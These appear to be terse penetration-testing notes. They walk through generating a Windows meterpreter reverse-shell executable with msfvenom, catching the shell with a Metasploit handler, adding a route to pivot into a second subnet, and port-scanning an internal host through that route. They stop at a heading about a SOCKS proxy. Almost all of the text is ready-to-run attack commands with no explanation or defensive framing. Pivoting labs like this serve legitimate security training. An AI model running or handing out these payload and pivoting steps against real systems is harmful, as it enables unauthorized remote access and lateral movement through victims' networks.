msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.70 LPORT=1234 -f exe -o temp.exe

msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp

Once you get the reverse shell, do an 'ifconfig' to get the IP and network information, then, to make our shell routable on 192.168.2.0, do...

run autorun -s 192.168.2.0/24

(background the shell)
background or bg

type 'route print' in metasploit and should get the route added for 192.168.2.0/24

search portscan
choose 'scanner/portscan/tcp' and set the RHOST, something such as 192.168.2.11
set ports 1-100
set THREADS 3
run
(we should see open ports, to validate the ports are opened)

USING THE SOCKSPROXY
